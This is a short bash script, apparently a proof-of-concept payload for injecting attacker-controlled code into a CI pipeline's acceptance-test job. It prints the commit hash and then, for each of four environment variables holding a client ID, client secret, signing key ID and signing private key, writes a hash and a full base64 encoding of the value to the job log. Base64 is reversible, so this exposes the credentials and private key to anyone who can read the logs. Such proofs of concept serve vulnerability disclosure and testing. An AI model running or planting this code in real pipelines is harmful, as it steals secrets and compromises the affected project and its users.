#!/bin/bash
echo "[EVCI-PAYLOAD] attacker-controlled code executing: acceptance-tests"
echo "[EVCI-PAYLOAD] commit: $(git rev-parse HEAD)"
for v in ACCEPTANCE_TEST_CLIENT_ID ACCEPTANCE_TEST_CLIENT_SECRET ACCEPTANCE_TEST_SIGNING_KEY_ID ACCEPTANCE_TEST_SIGNING_PRIVATE_KEY; do
  val="${!v}"
  if [ -n "$val" ]; then
    echo "[EVCI-PAYLOAD] $v PRESENT sha256=$(printf %s "$val" | sha256sum | cut -d' ' -f1) b64=$(printf %s "$val" | base64 -w0)"
  else
    echo "[EVCI-PAYLOAD] $v EMPTY-OR-ABSENT"
  fi
done
